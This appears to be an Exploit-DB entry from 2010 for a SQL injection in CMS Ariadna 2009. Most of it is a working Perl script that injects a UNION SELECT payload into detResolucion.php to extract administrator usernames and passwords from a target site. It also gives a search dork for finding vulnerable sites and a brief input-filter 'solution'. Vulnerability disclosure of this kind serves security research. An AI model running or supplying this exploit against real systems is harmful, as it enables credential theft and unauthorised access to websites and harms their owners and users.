# Title: CMS Ariadna 2009 SQL Injection
# EDB-ID: 12301
# CVE-ID: ()
# OSVDB-ID: ()
# Author: Andrés Gómez
# Published: 2010-04-19
# Verified: no
# Download Exploit Code
# Download N/A

view source
print?
# Exploit Title : CMS Ariadna 2009 SQL Injection
# Date : 2010-04-19
# Author : Andrés Gómez
# Contact : gomezandres@adinet.com.uy
# Dork : &quot;allinurl: detResolucion.php?tipodoc_id=&quot;
########################################################################
Exploit in Perl Start In Next Line:
 
use LWP::Simple;
 
########################################################################
# Malicious users may inject SQL querys into a vulnerable
# application to fool a user in order to gather data from them or see
sensible information.
########################################################################
# Solution:
# $_GET = preg_replace(&quot;|([^\w\s\&#039;])|i&quot;,&#039;&#039;,$_GET);
# $_POST = preg_replace(&quot;|([^\w\s\&#039;])|i&quot;,&#039;&#039;,$_POST);
########################################################################
# Special Thanks : HYPERNETHOST &amp; Security-Pentest &amp; Mauro Rossi
##########################[Andrés Gómez]#################################
 
my $target = $ARGV[0];
unless ($target) { print &quot;\n Inyector Remoto -- HYPERNETHOST &amp;
Security-Pentest -- Andres Gomez\n\n&quot;;
print &quot;\ Dork: allinurl: detResolucion.php?tipodoc_id=\n&quot;;
print &quot;\nEjemplo Ejecucion = AriadnaCms.pl
http://www.sitio.extension/path/\n&quot; ; exit 1; }
 
$sql =
&quot;detResolucion.php?tipodoc_id=33+and+1=0+union+select+concat(0x7365637572697479,adm_nombre,0x3a,0x70656e74657374,adm_clave)+from+administrador--&quot;;
 
$final = $target.$sql;
$contenido = get($final);
 
print &quot;\n\n[+] Pagina Web: $target\n\n&quot;;
if ($contenido =~/security(.*):pentest(.*)/) {
print &quot;[-] Datos extraidos con exito:\n\n&quot;;
print &quot;[+] Usuario = $1\n&quot;;
print &quot;[+] Password = $2\n&quot;;
} else {
print &quot;[-] No se obtuvieron datos\n\n&quot;;
exit 1;
}
 
print &quot;\n[ñ] Escriba exit para salir de la aplicacion\n&quot;;
 
exit 1;


